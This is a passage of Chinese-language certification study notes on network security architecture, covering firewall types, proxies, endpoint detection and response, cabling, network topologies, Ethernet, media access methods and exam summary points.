墙无法做到的几点</p><p>1、阻止通过其他授权通信渠道传输的病毒或恶意代码</p><p>2、防止用户未经授权蓄意或无意间泄露信息</p><p>3、防止恶意用户攻击防火墙后面的设施</p><p>4、在数据传出或进入专用网络后保护数据</p><p>解决方案</p><p>通过特殊的附加模块或配套产品（如反病毒扫描程序、DLP 和 IDS 工具）添加这些功能。</p><p>防火墙需要记录的内容</p><p>1、网络流量活动</p><p>2、重启防火墙</p><p>3、代理或依赖项不能启动或无法启动</p><p>4、代理或其他重要服务崩溃或重新启动</p><p>5、更改防火墙配置文件</p><p>6、防火墙运行时的配置或系统错误</p><h3 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h3><h4 id="静态数据包过滤防火墙"><a href="#静态数据包过滤防火墙" class="headerlink" title="静态数据包过滤防火墙"></a>静态数据包过滤防火墙</h4><p>也被称为筛选路由器通过检查消息头中的数据来过滤流量。</p><p>规则涉及源、目标IP地址（第 3 层）和端口号（第 4 层）。</p><p>无状态防火墙，每个数据包单独评估，不会根据上下文数据包做决定。</p><h4 id="应用级防火墙"><a href="#应用级防火墙" class="headerlink" title="应用级防火墙"></a>应用级防火墙</h4><p>基于单个互联网服务、协议或应用过滤流量。</p><p>运行在 OSI 模型的应用层（第 7 层）</p><p>实例：Web 应用防火墙（WAF）</p><p>下一代安全 Web 网络（SWG、NGSWG、NG-SWG）是 NGFW 和 WAF 理念的变体和组合。</p><p>SWG 是一种基于云的 Web 网关解决方案。</p><p>SWG&#x2F;NG-SWG 支持的功能</p><p>1、标准 WAF 功能</p><p>2、TLS 解密</p><p>3、云访问安全代理（CASB）功能</p><p>4、高级威胁防护（ATP），例如沙箱和基于 ML 的威胁检测</p><p>5、DLP</p><p>6、丰富的流量元数据及详细的日志记录和报告</p><h4 id="电路级防火墙"><a href="#电路级防火墙" class="headerlink" title="电路级防火墙"></a>电路级防火墙</h4><p>也被称为电路代理用于在可信赖的合作伙伴之间建立通信会话。</p><p>理论上在会话层（第 5 层）运行，实际在传输层建立 TCP 会话。</p><p>SOCKS（Socket Secure）是电路级防火墙的常见实现方式。</p><p>侧重基于 IP 地址和端口的简单规则使用强制门户建立电路（或会话），需要通过 802.1X 进行端口身份认证，或更复杂的元素。</p><p>无状态防火墙。</p><h4 id="状态检查防火墙"><a href="#状态检查防火墙" class="headerlink" title="状态检查防火墙"></a>状态检查防火墙</h4><p>也被称为动态数据包过滤防火墙，评估网络流量的状态、会话或上下文。</p><p>通过检查源和目标地址、应用程序使用情况、来源（即本地或远程、物理端口，甚至路由路由&#x2F;向量）以及当前数据包与同一会话的先前数据包之间的关系。</p><p>运行在 OSI 模型的第 3～7层</p><p>可以保留会话中以前数据包的信息，以检测不需要的或恶意的流量，也就是上下文分析或语境分析。</p><p>状态检查防火墙可以执行深度数据包检查，对数据包的有效载荷或内容进行分析。</p><p>深度数据包检查（DPI）、有效负载检查或内容过滤是评估和过滤通信有效负载内容（而不仅限于报头值）的手段。</p><p>DPI 过滤能够阻止有效通信负载中的域名、恶意软件、垃圾邮件、恶意脚本、滥用内容或其他可识别元素。</p><h4 id="下一代防火墙"><a href="#下一代防火墙" class="headerlink" title="下一代防火墙"></a>下一代防火墙</h4><p>下一代防火墙（next-generation firewall，NGFW）是一种多功能设备（MFD），或统一威胁管理（UTM）。</p><p>集成组件可以包括应用程序过滤、深度数据包检测、TLS卸载和或检查（也叫 TLS 终止代理）、域名和 URL 过滤、IDS、IPS、Web 内容过滤、QoS 管理、带宽限制&#x2F;管理、NAT、VPN 锚定、身份认证服务、身份管理和反病毒&#x2F;反恶意软件扫描。</p><h4 id="内部分段防火墙"><a href="#内部分段防火墙" class="headerlink" title="内部分段防火墙"></a>内部分段防火墙</h4><p>内部分段防火墙（internal segmentation firewall，ISFW）内部分段防火墙是部署在内部网络分段或公司部门之间的防火墙。</p><p>目的在于防止恶意代码或有害协议在专用网络中进一步传播。</p><p>ISFW 通常用于微分网段体系结构。</p><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>代理服务器（proxy server）是应用级防火墙或电路级防火墙的变体。</p><p>代理服务器用于在客户端和服务器之间进行调解。</p><p>代理服务器最常用于为专用网络上的客户端提供互联网访问，同时保护客户端的身份，类似于 NAT。</p><p>代理服务器可以提供缓存站点或内容过滤。</p><p>反向代理提供和正向代理相反的功能：处理从外部系统到内部服务的入站请求。</p><p>反向代理类似于端口转发和静态NAT的功能。</p><p>透明代理</p><p>​没有配置直接向代理发送查询，但是流量路由到代理。</p><p>非透明代理</p><p>​配置为直接向代理发送查询，配置可以手动进行，也可以使用代理自动配置（PAC）文件进行。PAC 可通过脚本或 DHCP 实现。</p><h4 id="内容-URL-过滤器"><a href="#内容-URL-过滤器" class="headerlink" title="内容&#x2F;URL 过滤器"></a>内容&#x2F;URL 过滤器</h4><p>内容过滤或内容检查是检查应用程序协议有效负载内容的安全过滤功能。</p><p>检查基于关键字匹配。</p><p>深度包检查：不需要的地址或 URL 的基本阻止列表用于控制允许或不允许哪些内容到达用户。</p><p>恶意软件检查是指使用恶意软件扫描器检测网络流量中不需要的软件内容。</p><p>URL 过滤，也被称为 Web 过滤，是基于请求访问的全部或部分URL阻止对网站的访问行为，可以关注完全限定域名（fully qualified domain name，FQDN）的全部或部分、特定路径名、文件名、文件扩展名或整个URL。</p><p>Web 安全网关是一种 Web 内容过滤器（通常基于 URL 和内容关键字）,也支持恶意软件扫描。</p><p>一些 Web 安全网关被认为是 UTM 或 NGFW，因为包括一些非 Web 功能，例如即时消息（IM）过滤、电子邮件过滤、垃圾邮件阻止和欺骗检测。</p><h2 id="11-16-5端点安全"><a href="#11-16-5端点安全" class="headerlink" title="11.16.5端点安全"></a>11.16.5端点安全</h2><p>端点安全是指无论网络或电信通道是否提供安全性，每个单独的设备都必须维护本地安全的概念。</p><h3 id="端点保护策略"><a href="#端点保护策略" class="headerlink" title="端点保护策略"></a>端点保护策略</h3><ul><li>必须对电子邮件进行筛选，使其不会成为恶意软件感染的媒介；电子邮件还应该遵守一些策略以管理其适当使用并限制其潜在责任</li><li>必须创建下载&#x2F;上传策略，以便筛选传入和传出的数据，并阻止可疑材料</li><li>系统必须受到强大的访问控制，其中可能包括多因素身份认证和&#x2F;或生物测定，以限制对最终用户设备的访问，并防止未经授权访问服务器和服务的行为</li><li>应该安装受限制的用户界面机制和数据库管理系统，并根据需要使用这些机制和系统，以限制和管理对关键信息的访问，从而使用户仅对敏感资源进行必要的访问</li><li>文件加密可能适合于存储在客户机上的文件和数据，实际上，驱动器级加密非常适合移动设备。</li><li>超时后强制执行屏幕保护程序</li><li>必须隔离在用户和监控模式下运行的进程，以防止对高权限进程和功能进行未经授权和不必要的访问</li><li>应该创建保护域或网段，客户端受到的损害不会自动危害整个网络</li><li>磁盘和其他敏感材料应清楚标明其安全分类或组织敏感级别；程序过程和系统控制应结合起来，以帮助保护敏感材料，使其不受不必要或未经授权的访问</li><li>理想情况下，台式计算机上的文件以及服务器上的文件都应该备份</li><li>台式计算机用户需要定时的安全意识培训，以保持适当的安全意识；还需要了解潜在的威胁，并学习如何适当的处理这些威胁。</li><li>台式计算机及其存储介质需要防止环境危害（温度、湿度、电源损耗&#x2F;波动等）</li><li>台式计算机应该被纳入组织的灾难恢复和业务连续性规划，有助于让用户返回到其他系统上工作，而且其作用可能与别的系统和服务一样重要</li><li>内置和用于分布式环境的定制软件的开发人员还需要考虑安全性，包括使用正式的开发和部署方法，如代码库、更改控制机制、配置管理以及补丁和更新部署。</li></ul><h3 id="端点检测和响应EDR"><a href="#端点检测和响应EDR" class="headerlink" title="端点检测和响应EDR"></a>端点检测和响应EDR</h3><p>端点检测和响应（endpoint detection and response）是一种安全机制，是传统反恶意软件产品、IDS 和防火墙解决方案的演变。</p><p>EDR 旨在检测、记录、评估和响应可疑活动和事件。</p><p>EDR 的目标是检测更高级的滥用行为，而这些行为可能是传统防病毒程序或 HIDS 难以检测到的。</p><p>EDR 应优化事件响应的响应时间、清除误报，实施高级威胁拦截，抵御同时发生的多个威胁，并通过各种威胁向量进行保护。</p><h4 id="EDR-相关概念"><a href="#EDR-相关概念" class="headerlink" title="EDR 相关概念"></a>EDR 相关概念</h4><h5 id="托管检测和响应MDR"><a href="#托管检测和响应MDR" class="headerlink" title="托管检测和响应MDR"></a>托管检测和响应MDR</h5><p>托管检测和响应（managed detection and response，MDR）</p><p>MDR 侧重于威胁检测和调解，不限于端点的范围，是一种试图实施监控 IT 环境以快速检测和解决威胁的服务</p><p>MDR解决方案通常是多种技术的组合和集成，包括 SIEM、网络流量分析（network traffic analysis，NTA）、EDR 和 IDS 。</p><h5 id="端点保护平台EPP"><a href="#端点保护平台EPP" class="headerlink" title="端点保护平台EPP"></a>端点保护平台EPP</h5><p>端点保护平台（endpoint protection platform，EPP）</p><p>EDR 的变体。</p><p>EPP的重点安全功能：预测、预防、检测和响应。</p><p>EPP 更主动地进行预防和预测。</p><h5 id="扩展检测和响应XDR"><a href="#扩展检测和响应XDR" class="headerlink" title="扩展检测和响应XDR"></a>扩展检测和响应XDR</h5><p>扩展检测和响应（extended detection and response，XDR）</p><p>将多个概念并集到一个解决方案中，组件因供应商而异，通常包括 EDR、MDR 和 EPP元素，还包括 NTA、NIDS 和 NIPS 功能。</p><p><strong>托管安全服务提供商</strong>（managed security service  provider，MSSP）可以提供集中控制和管理的 XDR 解决方案。</p><p>MSSP 解决方案可以本地部署，也可以云上或混合云部署，通过 SOC 监督，SOC 可以是本地或远程的。</p><h2 id="11-16-6布线、拓扑和传输介质技术"><a href="#11-16-6布线、拓扑和传输介质技术" class="headerlink" title="11.16.6布线、拓扑和传输介质技术"></a>11.16.6布线、拓扑和传输介质技术</h2><h3 id="局域网和广域网"><a href="#局域网和广域网" class="headerlink" title="局域网和广域网"></a>局域网和广域网</h3><p><strong>局域网</strong>：LAN 是有限的地理区域的网络。通常跨越楼层或建筑物。</p><p><strong>广域网</strong>：WAN是指地理上远程网络之间的长距离连接。</p><h2 id="11-16-7传输介质"><a href="#11-16-7传输介质" class="headerlink" title="11.16.7传输介质"></a>11.16.7传输介质</h2><p>每种电缆类型都有独特的有效传输距离、吞吐率和连接要求。</p><p>传输介质不单单是电缆，无线、LiFi、蓝牙、Zigbee 和卫星，都是传输介质</p><h3 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h3><p>同轴电缆（coaxial cable）也被称为 coax，是一种流行的网络电缆类型。</p><p>同轴电缆具有一层绝缘层包围的铜线芯，绝缘层又由导电编织屏蔽层包围并封装在最终绝缘保护套中。</p><p>中心的铜芯和编织屏蔽层是两个独立的导体，允许双向通信。</p><h4 id="同轴电缆类型"><a href="#同轴电缆类型" class="headerlink" title="同轴电缆类型"></a>同轴电缆类型</h4><h5 id="细网（10Base2）"><a href="#细网（10Base2）" class="headerlink" title="细网（10Base2）"></a>细网（10Base2）</h5><p>通常用于将系统连接到粗网布线的主干中继线。</p><p>跨越 185 米的距离</p><p>提供 10 Mbps 的吞吐量</p><h5 id="粗网（10Base5）"><a href="#粗网（10Base5）" class="headerlink" title="粗网（10Base5）"></a>粗网（10Base5）</h5><p>跨越 500 米的距离</p><p>提供 10 Mbps 的吞吐量</p><h4 id="同轴电缆的问题"><a href="#同轴电缆的问题" class="headerlink" title="同轴电缆的问题"></a>同轴电缆的问题</h4><ul><li>使同轴电缆的弯曲超过最大圆弧半径，造成中心导体断裂。</li><li>部署同轴电缆的长度超出其建议的最大长度（10Base2 为 185 米，10Base5 为 500米）</li><li>未使用 50 欧姆的电阻器正确端接同轴电缆的末端</li><li>未将端接的同轴电缆的至少一端接地</li></ul><h3 id="基带和宽带电缆"><a href="#基带和宽带电缆" class="headerlink" title="基带和宽带电缆"></a>基带和宽带电缆</h3><p>用于标记大多数网络电缆技术的命名约定遵循语法 XXyyyyZZ 。</p><p>XX 表示电缆类型提供的最大速度，例如 10Base2 为 10 Mbps。</p><p>yyyy 代表电缆的基带或宽带方面，例如 10Base2 电缆的基带。</p><p>基带电缆一次只能传输一个信号，宽带电缆可以同时传输多个信号。</p><p>ZZ 要么代表电缆可以使用的最大距离，要么用作电缆技术的简写形式，例如  10Base2 电缆的最大长度大约为 200米，准确是 185 米。</p><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><p>四对互相缠绕在一起的电线组成，套在 PVC 绝缘体内。</p><p>屏蔽双绞线（STP），外部护套下有金属箔包装，箔片提供额外的外部电磁干扰保护。</p><p>非屏蔽双绞线（UTP），外部护套下没有金属箔包装。</p><p>铜线的扭曲缠绕有利于抵御外部射频和电磁干扰，并减少线对之间的干扰。</p><p>扭曲越紧（每英尺扭曲越多），电缆对内部和外部干扰和串扰的抵抗力越大，吞吐量（即带宽）也就越大。</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/image-20250307092929983.png" alt="image-20250307092929983"></p><h4 id="双绞线布线问题"><a href="#双绞线布线问题" class="headerlink" title="双绞线布线问题"></a>双绞线布线问题</h4><ul><li>使用错误类别的双绞线电缆进行高吞吐量网络连接</li><li>部署的双绞线长度超过建议的最大长度（100米）</li><li>在具有显著干扰的环境中使用 UTP.</li></ul><h3 id="导线"><a href="#导线" class="headerlink" title="导线"></a>导线</h3><p>基于导体的网络布线的距离限制源于被用作导体的金属的电阻。</p><p>铜是最受欢迎的导体，市场上最好、最便宜的室温导体之一，任然存在电阻。</p><p>电阻导致信号强度和质量随电缆长度的增加而降低。</p><p>随着传输速度的提升缩短线缆的长度，因为信号的退化程度在某一点可能开始影响数据的有效传输，也就是信号衰减。</p><p>可以通过使用中继器或集中器来延长电缆长度。</p><p>中继器是一种信号放大设备，提升输入数据流的信号强度，并通过其第二个端口重新广播</p><p>集中器做同样的事情，只是它有两个以上的端口。</p><h3 id="光缆"><a href="#光缆" class="headerlink" title="光缆"></a>光缆</h3><p>基于导体的网络布线的替代方案是光缆。</p><p>光缆传输光脉冲，而不是电信号。</p><p>光缆优点：极快且几乎不受攻击和干扰。</p><p>光纤部署为单模（支持单个光信号）或多模（支持多个光信号）。</p><p>单模光纤具有较细的光纤芯、较低的远距离衰减以及潜在的无线带宽，不使用中继器的情况下传输 1 万米，用黄色护套。</p><p>多模光纤具有更粗的光纤芯、更高的距离衰减和带宽限制（与距离成反比），最大传输距离为 400 米，用蓝色护套。</p><h2 id="11-16-8网络拓扑"><a href="#11-16-8网络拓扑" class="headerlink" title="11.16.8网络拓扑"></a>11.16.8网络拓扑</h2><p>计算机和网络设备的物理布局和组织被称为网络拓扑。</p><p>逻辑拓扑和物理拓扑并非总是相同。</p><h3 id="物理拓扑-环形拓扑"><a href="#物理拓扑-环形拓扑" class="headerlink" title="物理拓扑-环形拓扑"></a>物理拓扑-环形拓扑</h3><p>环形拓扑将每个系统连接为圆上的点。</p><p>连接介质充当单向传输回路。</p><p>一次只有一个系统可传输数据。</p><p>流量管理由令牌执行。</p><p>容错机制：</p><p>相反方向上运行的双环路，以防单点故障。</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/%E6%88%AA%E5%B1%8F2025-03-08%2013.21.10.png" alt="截屏2025-03-08 13.21.10"></p><h3 id="总线拓扑"><a href="#总线拓扑" class="headerlink" title="总线拓扑"></a>总线拓扑</h3><p>总线拓扑将每个系统连接到干线或主干电缆。</p><p>总线上的所有系统都可以同时传输数据。</p><p>系统采用冲突避免机制，监听当前发生的其他任何流量，如果听到流量，则等待片刻再收听，如果没有听到流量，系统将发送其数据。</p><p>类型：</p><p>1、线性</p><p>采用单干线，所有系统直接连接到该干线。</p><p>2、树形</p><p>使用单个中继线，其分支可支持多个系统。</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/%E6%88%AA%E5%B1%8F2025-03-08%2013.25.50.png" alt="截屏2025-03-08 13.25.50"></p><h3 id="星形拓扑"><a href="#星形拓扑" class="headerlink" title="星形拓扑"></a>星形拓扑</h3><p>采用集中式连接设备，该设备可以是简单的集线器或交换机。</p><p>每个系统通过专用段连接到中央集线器，即使任何一个段失败，其他段可以继续运行。</p><p>存在单点故障风险。</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/%E6%88%AA%E5%B1%8F2025-03-08%2013.29.48.png" alt="截屏2025-03-08 13.29.48"></p><h3 id="网状拓扑"><a href="#网状拓扑" class="headerlink" title="网状拓扑"></a>网状拓扑</h3><p>使用多个路径将系统连接到其他系统。</p><p>全网状拓扑将每个系统连接到网络上的其他系统。</p><p>部分网状拓扑将许多系统连接到其他许多系统。</p><p>提供与系统的冗余连接，即使多个段出现故障，也不会严重影响连接。</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/%E6%88%AA%E5%B1%8F2025-03-08%2013.32.32.png" alt="截屏2025-03-08 13.32.32"></p><h2 id="11-16-9以太网"><a href="#11-16-9以太网" class="headerlink" title="11.16.9以太网"></a>11.16.9以太网</h2><p>以太网是一种共享介质 LAN 技术（也被称为广播技术）。</p><p>允许多个设备通过相同的介质进行通信，但要求设备轮流通信并检测冲突和避免冲突。</p><p>以太网采用广播域和冲突域。</p><p>以太网支持全双工通信（即完全双向），通常采用双绞线布线。</p><p>以太网通常部署在星形或总线拓扑上。</p><p>以太网基于 IEEE 802.3 标准。</p><p>以太网数据的各个单元被称为帧。</p><p>快速以太网支持 100 Mbps 吞吐量。</p><p>千兆以太网支持 1000 Mbps 吞吐量。</p><p>万兆以太网支持 10 000 Mbps (10 Gbps)吞吐量。</p><h2 id="11-16-10子技术"><a href="#11-16-10子技术" class="headerlink" title="11.16.10子技术"></a>11.16.10子技术</h2><p>大多数网络包含许多技术，而不是单一技术。</p><h3 id="模拟和数字"><a href="#模拟和数字" class="headerlink" title="模拟和数字"></a>模拟和数字</h3><p>用于通过物理介质（如电缆）实际传输信号的机制，有两种类型：</p><ul><li><p>模拟通信发生在频率、幅度、相位、电压等变化的连续信号上。</p><pre><code class="hljs">     连续信号的变化产生波形（与数字信号的方形相反）。</code></pre></li></ul><p>​实际通信是通过恒定信号的变化发生的。</p><ul><li>通过使用不连续的电信号和状态改变或开关脉冲来进行数字通信。</li></ul><p>数字信号比长距离或存在干扰时的模拟信号更可靠。原因在于采用直流电压的数字信号的明确信息存储方式，其中电压 on 表示值 1，电压 off 表示值 0。</p><h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><p>某些通信与某种时钟或定时活动同步，通信时同步或异步的。</p><ul><li><p>同步通信依赖于基于独立时钟或嵌入数据流中的时间戳的定时或时钟机制。</p><p><strong>同步通信通常能够支持非常高的数据传输速率</strong>。</p></li><li><p>异步通信使用停止和启动分隔符位来管理数据传输。</p><p>由于使用了分隔符位及其传输的停止和启动特性，<strong>异步通信最适合用于较少量的数据</strong>。</p></li></ul><h3 id="基带和宽带"><a href="#基带和宽带" class="headerlink" title="基带和宽带"></a>基带和宽带</h3><p>决定通过电缆段能够同时进行多少通信的是</p><p>使用基带技术还是宽带技术。</p><h4 id="基带技术"><a href="#基带技术" class="headerlink" title="基带技术"></a>基带技术</h4><p>只能支持单个通信通道。</p><p>是一种数字信号。</p><p>以太网使用基带技术。</p><h4 id="宽带技术"><a href="#宽带技术" class="headerlink" title="宽带技术"></a>宽带技术</h4><p>宽带技术可以支持多个同步信号。</p><p>使用频率调制来支持多个信道，每个信道支持不同的通信会话。</p><p>适合于高吞吐率。</p><p>是一种模拟信号。</p><p>有线电视、有线调制解调器、DSL、T1 和 T3 使用宽带技术。</p><h3 id="广播、多播和单播"><a href="#广播、多播和单播" class="headerlink" title="广播、多播和单播"></a>广播、多播和单播</h3><p>广播、多播和单播技术确定单个传输可以到达的目的地数量。</p><ul><li>多播（broadcast）支持与所有可能的接收者进行通信。</li><li>多播（multicast）支持与多个特定接收者的通信。</li><li>单播（unicast）仅支持与特定接收者的单一通信。</li></ul><h3 id="局域网介质访问"><a href="#局域网介质访问" class="headerlink" title="局域网介质访问"></a>局域网介质访问</h3><p>至少有五种 LAN 介质访问技术可以用于避免与防止传输冲突。</p><p>一些技术可以主动防止冲突，其他技术可以应对冲突。</p><h4 id="载波侦听多路访问CSMA"><a href="#载波侦听多路访问CSMA" class="headerlink" title="载波侦听多路访问CSMA"></a>载波侦听多路访问CSMA</h4><p>载波侦听多路访问（Carrier-Sense Multiple Access，CSMA）</p><p>不直接解决冲突。如果发生冲突，则通信不会成功，因此不会收到确认。导致发送系统重新发送数据并在此执行 CSMA 过程。</p><p><strong>执行步骤</strong>：</p><p>1、主机侦听 LAN 介质以确定是否正在使用中。</p><p>2、如果 LAN 介质未被使用，则主机发送通信。</p><p>3、主机等待确认。</p><p>4、如果超时后没有收到确认，则主机从步骤 1 重新开始。</p><h4 id="载波侦听多路访问-冲突检测-CSMA-CD"><a href="#载波侦听多路访问-冲突检测-CSMA-CD" class="headerlink" title="载波侦听多路访问&#x2F;冲突检测 CSMA&#x2F;CD"></a>载波侦听多路访问&#x2F;冲突检测 CSMA&#x2F;CD</h4><p>载波侦听多路访问&#x2F;冲突检测（Carrier- Sense Multiple Access with Collision Detection，CSMA&#x2F;CD）</p><p>以太网采用 CSMA&#x2F;CD 技术，通过让冲突域的每个成员在开始该过程之前等待一段短暂但随机的时间来响应冲突。</p><p>因为发送冲突后，需要对冲突作出响应或反应，会导致传输延迟以及重复传输，从而导致与 40% 的潜在吞吐量损失。</p><p><strong>执行步骤</strong>：</p><p>1、主机侦听 LAN 介质以确定它是否正在使用中。</p><p>2、如果 LAN 介质未被使用，则主机发送通信。</p><p>3、在发送时，主机侦听冲突（即两个或多个主机同时发送）。</p><p>4、如果检测到冲突，则主机发送阻塞信号。</p><p>5、如果收到阻塞信号，则所有主机都停止发送，每个主机等待一段随机时间，从步骤 1 开始。</p><h4 id="载波侦听多路访问-冲突避免CSMA-CA"><a href="#载波侦听多路访问-冲突避免CSMA-CA" class="headerlink" title="载波侦听多路访问&#x2F;冲突避免CSMA&#x2F;CA"></a>载波侦听多路访问&#x2F;冲突避免CSMA&#x2F;CA</h4><p>载波侦听多路访问&#x2F;冲突避免（Carrier- Sense Multiple Access with Collision Avoidance，CSMA&#x2F;CA）</p><p><strong>执行步骤</strong>：</p><p>1、主机有两个到 LAN 介质的连接，入站和出站。主机侦听入站连接以确定介质是否正在使用中。</p><p>2、如果未使用介质，则主机请求传输权限。</p><p>3、如果在超时后未授予权限，则主机将从步骤 1 重新开始</p><p>4、如果授予权限，则主机通过出站连接发送通信</p><p>5、主机等待确认</p><p>6、如果在超时后未收到确认，则主机将从步骤 1 重新开始。</p><p>802.11 无线网络采用 CSMA&#x2F;CA 技术。</p><p>CSMA&#x2F;CA在任何给定时间仅授予单一通信权限。</p><p>需要指定主系统来响应请求并授予发送数据传输的权限。</p><p><strong>令牌传递</strong></p><p>使用数字令牌执行通信的 LAN 介质访问技术。</p><p>拥有令牌的主机才允许传输数据，传输完成后将令牌释放到下一个系统。</p><p>令牌基于环形拓扑的网络进行传递。</p><p><strong>轮询</strong></p><p>使用主从配置执行的 LAN 介质访问技术。</p><p>一个系统被标记为主系统，而其他所有系统都标记为次要系统。</p><p>主要系统轮询或查询每个二级系统是否需要传输数据。</p><p>轮询与 CSMA&#x2F;CA 方法正好相反，CSMA &#x2F; CA 允许从服务器请求权限，轮询只能通过主服务器分配权限，可讲轮询配置为授权一个或多个系统优先级，使其优先于其他系统。</p><h1 id="本章小节"><a href="#本章小节" class="headerlink" title="本章小节"></a>本章小节</h1><h1 id="考试要点"><a href="#考试要点" class="headerlink" title="考试要点"></a>考试要点</h1><h2 id="了解OSI模型"><a href="#了解OSI模型" class="headerlink" title="了解OSI模型"></a>了解OSI模型</h2><p>OSI模型层如下：</p><p>应用层</p><p>表示层</p><p>会话层</p><p>传输层</p><p>网络层</p><p>数据链路层</p><p>物理层</p><h2 id="理解封装"><a href="#理解封装" class="headerlink" title="理解封装"></a>理解封装</h2><p>封装是指在将每层从上一层接收到数据传递到下一层之前，向其添加头部，也有可能添加尾部。</p><p>反向操作是解封</p><h2 id="了解网络容器名称"><a href="#了解网络容器名称" class="headerlink" title="了解网络容器名称"></a>了解网络容器名称</h2><p>网络容器包括：</p><p>OSI第 5-7 层协议数据单元（PDU）</p><p>第 4 层段（TCP）或数据报（UDP）</p><p>第 3 层数据包</p><p>第 2 层帧</p><p>第 1 层比特</p><h2 id="了解协议分析器"><a href="#了解协议分析器" class="headerlink" title="了解协议分析器"></a>了解协议分析器</h2><p>协议分析器是用于检查网络流量内容的工具</p><h2 id="理解MAC地址"><a href="#理解MAC地址" class="headerlink" title="理解MAC地址"></a>理解MAC地址</h2><p>媒体访问控制（MAC）地址是以十六进制表示法编写的 6 字节（48位）二进制地址，也称为物理地址、硬件地址、NIC地址和以太网地址。</p><p>地址的前 3 个字节（24位）是组织唯一标识符（OUI），表示供应商或制造商。</p><h2 id="了解路由协议"><a href="#了解路由协议" class="headerlink" title="了解路由协议"></a>了解路由协议</h2><p>内部路由协议是距离矢量（路由信息协议 RIP 和内部网关路由协议 IGRP）和链路状态（开放最短路径优先和中间系统到中间系统）</p><p>外部路由协议是路径向量（尽管使用网络接口，有时也使用网络访问）</p><h2 id="注意常见的应用层协议"><a href="#注意常见的应用层协议" class="headerlink" title="注意常见的应用层协议"></a>注意常见的应用层协议</h2><p>Telnet</p><p>FTP</p><p>TFTP</p><p>SMTP</p><p>POP3</p><p>IMAP</p><p>DHCP</p><p>HTTP</p><p>HTTPS（TLS）</p><p>LPD</p><p>X Window</p><p>NFS</p><p>SNMP</p><h2 id="了解传输层协议"><a href="#了解传输层协议" class="headerlink" title="了解传输层协议"></a>了解传输层协议</h2><p>了解 TCP 和 UDP 之间的特性和差异</p><p>熟悉端口、会话管理和 TCP 头标志</p><h2 id="了解-DNS"><a href="#了解-DNS" class="headerlink" title="了解 DNS"></a>了解 DNS</h2><p>域名系统（DNS）是公共和专用网络中使用的分层命名方案。</p><p>DNS 将人性化的完全限定域名（FQDN）和 IP 地址连接在一起。</p><p>DNSSEC 和 DoH 都是 DNS 的安全功能。</p><h2 id="了解-DNS-中毒"><a href="#了解-DNS-中毒" class="headerlink" title="了解 DNS 中毒"></a>了解 DNS 中毒</h2><p>DNS 中毒是伪造客户端使用的 DNS 信息以到达所需系统的行为。</p><p>可以通过流氓 DNS 服务器、域欺骗、更改 HOSTS 文件、破坏 IP 配置、DNS 查询欺骗和代理伪造实现。</p><h2 id="了解域名劫持"><a href="#了解域名劫持" class="headerlink" title="了解域名劫持"></a>了解域名劫持</h2><p>域名劫持或域名盗窃是指未经有效所有者授权而更改域名注册的恶意行为。</p><h2 id="理解误植域名攻击"><a href="#理解误植域名攻击" class="headerlink" title="理解误植域名攻击"></a>理解误植域名攻击</h2><p>当用户错误的键入预期资源的域名或 IP 地址时可能发生误植域名攻击，该攻击是一种用于捕获和重定向流量的做法。</p><h2 id="了解-IP"><a href="#了解-IP" class="headerlink" title="了解 IP"></a>了解 IP</h2><p>熟悉 IPv4 和 IPv6 之间的特性和差异。</p><p>了解  IPv4 类、子网和 CIDR 表示法。</p><h2 id="了解网络层协议"><a href="#了解网络层协议" class="headerlink" title="了解网络层协议"></a>了解网络层协议</h2><p>熟悉 ICMP 和 IGMP</p><h2 id="了解-ARP"><a href="#了解-ARP" class="headerlink" title="了解 ARP"></a>了解 ARP</h2><p>地址解析协议（ARP）对于逻辑和物理寻址方案的互操作性至关重要。</p><p>ARP 用于将 IP 地址解析位 MAC 地址。</p><p>需要了解 ARP 中毒。</p><h2 id="能够举出安全通信协议的示例"><a href="#能够举出安全通信协议的示例" class="headerlink" title="能够举出安全通信协议的示例"></a>能够举出安全通信协议的示例</h2><p>IPsec</p><p>Kerberos</p><p>SSH</p><p>信令协议</p><p>S-RPC</p><p>TLS</p><h2 id="了解多层协议"><a href="#了解多层协议" class="headerlink" title="了解多层协议"></a>了解多层协议</h2><p>多层协议的好处包括：</p><p>可以在更高级的 OSI 